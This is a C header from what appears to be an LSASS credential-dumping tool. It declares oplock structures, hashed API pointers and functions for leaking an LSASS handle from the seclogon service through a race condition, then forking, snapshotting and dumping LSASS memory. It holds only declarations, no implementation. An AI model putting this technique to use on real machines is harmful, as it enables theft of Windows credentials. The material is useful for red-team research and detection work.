#pragma once

#include <windows.h>
#include <winternl.h>

#include "nanodump.h"
#include "handle.h"
#include "dinvoke.h"

#if defined(NANO) && !defined(SSP)

#ifndef CTL_CODE

#define CTL_CODE( DeviceType, Function, Method, Access ) (                 \
    ((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method) \
)

#endif /* CTL_CODE */

#ifndef REQUEST_OPLOCK_CURRENT_VERSION

#define REQUEST_OPLOCK_CURRENT_VERSION 1

typedef struct _REQUEST_OPLOCK_INPUT_BUFFER {
  USHORT StructureVersion;
  USHORT StructureLength;
  ULONG RequestedOplockLevel;
  ULONG Flags;
} REQUEST_OPLOCK_INPUT_BUFFER, *PREQUEST_OPLOCK_INPUT_BUFFER;

typedef struct _REQUEST_OPLOCK_OUTPUT_BUFFER {
  USHORT StructureVersion;
  USHORT StructureLength;
  ULONG OriginalOplockLevel;
  ULONG NewOplockLevel;
  ULONG Flags;
  ACCESS_MASK AccessMode;
  USHORT ShareMode;
} REQUEST_OPLOCK_OUTPUT_BUFFER, *PREQUEST_OPLOCK_OUTPUT_BUFFER;

#endif /* REQUEST_OPLOCK_CURRENT_VERSION */

#ifndef OPLOCK_LEVEL_CACHE_READ
#define OPLOCK_LEVEL_CACHE_READ         (0x00000001)
#endif
#ifndef OPLOCK_LEVEL_CACHE_HANDLE
#define OPLOCK_LEVEL_CACHE_HANDLE       (0x00000002)
#endif
#ifndef OPLOCK_LEVEL_CACHE_WRITE
#define OPLOCK_LEVEL_CACHE_WRITE        (0x00000004)
#endif

#ifndef REQUEST_OPLOCK_INPUT_FLAG_REQUEST
#define REQUEST_OPLOCK_INPUT_FLAG_REQUEST               (0x00000001)
#endif
#ifndef REQUEST_OPLOCK_INPUT_FLAG_ACK
#define REQUEST_OPLOCK_INPUT_FLAG_ACK                   (0x00000002)
#endif
#ifndef REQUEST_OPLOCK_INPUT_FLAG_COMPLETE_ACK_ON_CLOSE
#define REQUEST_OPLOCK_INPUT_FLAG_COMPLETE_ACK_ON_CLOSE (0x00000004)
#endif

#ifndef FILE_DEVICE_FILE_SYSTEM
#define FILE_DEVICE_FILE_SYSTEM           0x00000009
#endif

#ifndef METHOD_BUFFERED
#define METHOD_BUFFERED                   0
#endif

#ifndef FILE_ANY_ACCESS
#define FILE_ANY_ACCESS                   0x00000000
#endif

#ifndef FSCTL_REQUEST_OPLOCK
#define FSCTL_REQUEST_OPLOCK CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 144, METHOD_BUFFERED, FILE_ANY_ACCESS)
#endif

struct TEB
{
    struct _NT_TIB NtTib;
    VOID* EnvironmentPointer;
    struct _CLIENT_ID ClientId;
    VOID* ActiveRpcHandle;
    VOID* ThreadLocalStoragePointer;
    struct _PEB* ProcessEnvironmentBlock;
};

typedef struct _FILE_PROCESS_IDS_USING_FILE_INFORMATION
{
    ULONG NumberOfProcessIdsInList;
    ULONG_PTR ProcessIdList[1];
} FILE_PROCESS_IDS_USING_FILE_INFORMATION, * PFILE_PROCESS_IDS_USING_FILE_INFORMATION;

typedef struct _THREAD_PARAMETERS
{
    DWORD pid;
    LPWSTR cmdline;
    PBOOL file_lock_was_triggered;
} THREAD_PARAMETERS, *PTHREAD_PARAMETERS;

#define FileProcessIdsUsingFileInformation 47

typedef BOOL(WINAPI* CreateProcessWithLogonW_t) (LPCWSTR lpUsername, LPCWSTR lpDomain, LPCWSTR lpPassword, DWORD dwLogonFlags, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
typedef BOOL(WINAPI* CreateProcessWithTokenW_t) (HANDLE hToken, DWORD dwLogonFlags, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);

#define CreateProcessWithLogonW_SW2_HASH 0x39A92305
#define CreateProcessWithTokenW_SW2_HASH 0x03A92535

VOID change_pid(
    IN DWORD new_pid,
    OUT PDWORD previous_pid);

VOID set_command_line(
    IN BOOL use_malseclogon_locally,
    IN LPWSTR command_line,
    IN LPCSTR program_name,
    IN LPCSTR dump_path,
    IN BOOL fork_lsass,
    IN BOOL snapshot_lsass,
    IN BOOL use_valid_sig,
    IN BOOL use_lsass_shtinkering,
    IN LPWSTR synchronization_file);

BOOL save_new_process_pid(
    IN PPROCESS_LIST process_list,
    IN DWORD pid);

BOOL check_if_succeded(
    IN DWORD new_pid,
    IN LPWSTR dump_path);

VOID kill_created_processes(
    IN PPROCESS_LIST created_processes);

BOOL malseclogon_handle_leak(
    IN LPCSTR binary_path,
    IN LPCSTR dump_path,
    IN BOOL fork_lsass,
    IN BOOL snapshot_lsass,
    IN BOOL use_valid_sig,
    IN BOOL use_lsass_shtinkering,
    IN BOOL use_malseclogon_locally,
    IN DWORD lsass_pid,
    OUT PPROCESS_LIST* Pcreated_processes);

BOOL malseclogon_stage_1(
    IN LPCSTR program_name,
    IN LPCSTR dump_path,
    IN BOOL fork_lsass,
    IN BOOL snapshot_lsass,
    IN BOOL use_valid_sig,
    IN BOOL use_lsass_shtinkering,
    IN BOOL use_malseclogon_locally,
    IN DWORD lsass_pid,
    OUT PPROCESS_LIST process_list);

VOID malseclogon_trigger_lock(
    IN DWORD lsass_pid,
    IN LPWSTR cmdline,
    IN PBOOL file_lock_was_triggered);

DWORD WINAPI thread_seclogon_lock(
    IN LPVOID lpParam);

BOOL leak_lsass_handle_in_seclogon_with_race_condition(
    IN DWORD lsass_pid,
    OUT PHANDLE hEvent,
    OUT PHANDLE hFile);

DWORD get_pid_using_file_path(
    IN LPWSTR file_path);

DWORD get_seclogon_pid(VOID);

HANDLE malseclogon_race_condition(
    IN DWORD lsass_pid,
    IN DWORD permissions,
    IN DWORD attributes);

#ifdef EXE
HANDLE malseclogon_stage_2(VOID);
#endif

#endif
